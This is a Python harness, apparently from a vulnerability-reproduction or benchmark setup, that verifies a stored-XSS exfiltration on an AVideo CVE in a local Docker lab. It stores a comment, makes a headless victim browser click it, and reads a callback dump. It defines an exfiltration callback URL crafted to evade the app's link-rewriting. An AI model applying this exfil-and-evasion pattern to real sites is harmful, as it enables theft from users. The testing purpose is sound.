#!/usr/bin/env python3
"""Shared orchestration for the avideo-cve-2026-33500 xss-exfil canary.

One "probe" = (1) store a comment at the app, (2) reset the callback, (3) drive the headless
victim to visit the comment page and click the link, (4) read the callback. The observable
result is the callback dump; the per-run ${PCB_FLAG} appears there IFF the injected comment's
javascript: href actually EXECUTED in the victim (proving execution, not reflection).

Host ports come from verify.sh (PCB_TARGET_PORT / PCB_VICTIM_PORT / PCB_CALLBACK_PORT).
"""
import os
import time
import urllib.parse
import urllib.request

# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page; also dodges markDownToHTML()'s http:// URL-linkify post-step that would mangle it).
CB = '//callback:9000/c?f='


def _get(url, timeout=90):
    last = None
    for _ in range(3):
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except Exception as e:
            last = e
            time.sleep(2)
    raise last


def _post(url, data, timeout=30):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    last = None
    for _ in range(3):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except Exception as e:
            last = e
            time.sleep(2)
    raise last


PORT_MAP = {"v0": "33520", "v1": "33521", "v2": "33522"}


def run_payload(comment: str, version: str) -> str:
    """Store `comment`, drive the victim to view+click it on `version`, return the callback dump."""
    app = os.environ.get(f"PCB_TARGET_PORT_{version.upper()}", "") or os.environ.get("PCB_TARGET_PORT", "") or PORT_MAP.get(version, "")
    vic = os.environ.get("PCB_VICTIM_PORT") or ""
    cb = os.environ.get("PCB_CALLBACK_PORT") or ""
    if not (app.isdigit() and vic.isdigit() and cb.isdigit()):
        raise RuntimeError("PCB_TARGET_PORT/PCB_VICTIM_PORT/PCB_CALLBACK_PORT required")
    host_app = f"http://127.0.0.1:{int(app)}"
    victim = f"http://127.0.0.1:{int(vic)}"
    callback = f"http://127.0.0.1:{int(cb)}"
    _post(host_app + "/comment", {"c": comment})
    _get(callback + "/reset")
    q = urllib.parse.urlencode(
        {"target": INTERNAL_APP[version] + "/", "origin": INTERNAL_APP[version] + "/"}
    )
    _get(victim + "/visit?" + q)
    return _get(callback + "/dump")
